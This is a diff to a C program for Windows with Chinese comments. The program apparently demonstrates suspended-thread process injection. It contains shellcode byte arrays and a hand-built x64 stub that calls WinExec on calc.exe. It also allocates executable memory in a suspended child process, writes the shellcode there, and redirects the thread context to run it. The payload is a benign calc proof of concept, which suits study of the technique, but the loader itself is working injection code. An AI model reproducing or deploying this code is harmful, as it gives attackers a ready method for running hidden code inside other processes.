@@ -4,7 +4,7 @@
 
 int suspandthreat_injection_main1()
 {
-	UCHAR shellcode[] = {
+	UCHAR shellcode11[] = {
 	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
 	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
 	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
@@ -24,6 +24,33 @@ int suspandthreat_injection_main1()
 	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
 	0x65, 0x78, 0x65, 0x00
 	};
+
+	unsigned char shellcode[] = {
+		// 构建"calc.exe"字符串到栈上
+		0x48, 0x31, 0xC0,               // xor rax, rax
+		0x50,                           // push rax        ; null terminator
+		0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
+		0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"
+
+		// 设置参数并调用
+		0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
+		0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
+		0x5A,                           // pop rdx         ; 第二个参数
+
+		// 调用WinExec
+		0x48, 0xB8,                     // mov rax,
+		0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
+		0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
+		0x48, 0xF7, 0xD0,               // not rax
+		0xFF, 0xD0                      // call rax
+	};
+	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+	UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");
+	// 填充WinExec地址
+	*(UINT64*)(shellcode + 22) = ~WinExecAddr;
+
+	// 填充WinExec地址
+//*(UINT64*)(shellcode + 22) = ~WinExecAddr;
 
 	// 定义两个进程相关的结构体变量，都是内置结构体，可以直接定义，然后初始化为0
 	STARTUPINFOA si = { 0 };
@@ -46,34 +73,27 @@ int suspandthreat_injection_main1()
 		return 1;
 	}
 
-
-	// 根据进程id打开进程
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
-	if (hProcess == NULL)
-	{
-		printf("Open process failed error code: %d\n", (int)GetLastError());
-		return 1;
-	}
-
 	// 利用api挂起进程, 前面已经创建了挂起主线程的进程，这里如果再次挂起那么就需要resume两次才行（挂起次数是累计的）
 	// SuspendThread(pi.hThread);
 
 	// 申请一个目标进程中的内存区域
-	LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	LPVOID lpBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (lpBuffer == NULL)
 	{
 		printf("Virtual alloc failed error code ：%d\n", (int)GetLastError());
 		return 1;
 	}
 	// 显示出来申请区域的地址，方便调试的时候找
-	printf("shellcode address is : %p\n", lpBuffer);
 
 	// 将shellcode写进去，和远程进程注入一样
-	if (!WriteProcessMemory(hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL))
+	if (!WriteProcessMemory(pi.hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL))
 	{
 		printf("Write process memory failed error code：%d\n", (int)GetLastError());
 		return 1;
 	}
+
+	printf("shellcode address is : %p\n", lpBuffer);
+	getchar();
 
 	// 设置线程的上下文环境，让ip寄存器直接跳转
 	CONTEXT ctx = { 0 };
